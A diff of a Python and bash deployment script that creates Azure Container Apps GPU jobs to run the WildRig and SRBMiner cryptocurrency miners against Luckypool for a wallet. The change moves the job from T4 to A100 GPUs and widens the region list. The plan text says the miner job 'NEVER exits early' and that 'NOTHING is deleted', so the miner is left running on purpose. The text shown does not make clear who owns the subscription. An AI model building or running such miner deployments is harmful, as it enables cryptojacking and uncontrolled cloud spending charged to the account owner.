@@ -14,11 +14,11 @@ Shape (reuses the proven storage account / SAS capture + Container Apps job patt
  2. Account SAS container/blob round-trip (capture channel).
  3. Pre-upload WildRig 0.52.3 tarball (sha 7308c95f...) and SRBMiner 3.8.4 (sha
     3fb026b2...) to the blob container so the container can fetch over Azure.
- 4. ONE managedEnvironment with the Consumption-GPU-NC8as-T4 workload profile,
+ 4. ONE managedEnvironment with the Consumption-GPU-NC24-A100 workload profile,
     bounded region list starting westus3 (proven by 131412).
  5. ONE manual job, parallelism 1 / replicaCompletionCount 1, replicaTimeout 86400,
     whose container runs WildRig 0.52.3 (sha 002cd29c...) pearlhash pydp worker
-    13159801, then sticks to Luckypool 3362 after 900 s without an accepted share.
+    13289003, then sticks to Luckypool 3362 after 900 s without an accepted share.
     The container writes a status blob every 30 s and NEVER exits early.
  6. Poll the status blob for proof (acc>=1 rej=0 last accept fresh) then emit DONE.
     NOTHING is deleted: the miner is left running (no proof-then-teardown).
@@ -37,22 +37,22 @@ import urllib.request
 ARM = "https://management.azure.com"
 RG = "chriso-sandbox-rg"
 SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
-TAG = "C211_I131598"
-NONCE = "x131598t4"
-INTENT = "131598"
+TAG = "C211_I132890D"
+NONCE = "x132890a100d"
+INTENT = "132890"
 T0 = time.time()
 
 APP_VER = "2026-07-01"
 STG_VER = "2023-01-01"
-PROFILE = "Consumption-GPU-NC8as-T4"
+PROFILE = "Consumption-GPU-NC24-A100"
 IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
 SA_ACCT = "c211i1215775738445a"
 CONT = "c211"
-CONT2 = "c211-i131598"
-SA_NEW = ("c211i131598" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
+CONT2 = "c211-i132890a100d"
+SA_NEW = ("c211i132890d" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
 ENV_NAME = "c211-i131598-cae"
-JOB_NAME = "c211-131598-t4"
-REGIONS = ["westus3", "westus2", "westeurope", "northeurope", "southcentralus", "eastus2"]
+JOB_NAME = "c211-132890-a100d"
+REGIONS = ["centralus", "eastus2", "westus2", "northeurope", "swedencentral", "japaneast", "westus3", "westeurope", "southcentralus"]
 BUDGET = 2400          # payload poll budget (seconds)
 PROOF_GRACE = 240      # keep polling this long after first proof for confirmation
 
@@ -166,7 +166,7 @@ KIT = r"""#!/bin/bash
 D=/tmp/c211; mkdir -p "$D"; LOG="$D/kit.log"
 H=$(hostname 2>/dev/null || echo h)
 BASE="__BASE__"; Q="__Q__"; SAS="$BASE/__NONCE__-t4-$H.txt?$Q"
-W="__WALLET__"; N="__NOCK__"; WK="13159801"
+W="__WALLET__"; N="__NOCK__"; WK="13289003"
 WRURL="$BASE/__NONCE__-wildrig.tgz?$Q"
 SBURL="$BASE/__NONCE__-srb.bin?$Q"
 log() { echo "$(date -u +%FT%TZ) $*" >> "$LOG"; }
@@ -501,7 +501,7 @@ def main():
     for region in REGIONS:
         ab = {"westus3": "wus3", "westus2": "wus2", "westeurope": "weu",
               "northeurope": "neu", "southcentralus": "scus", "eastus2": "eus2"}.get(region, region[:6])
-        envname = ("c211-i131598-%s" % ab)[:32]
+        envname = ("c211-i132890d-%s" % ab)[:32]
         envurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
                   "managedEnvironments/%s?api-version=%s" % (ARM, sid, RG, envname, APP_VER))
         body = {"location": region, "tags": {"c211": INTENT, "nonce": NONCE},
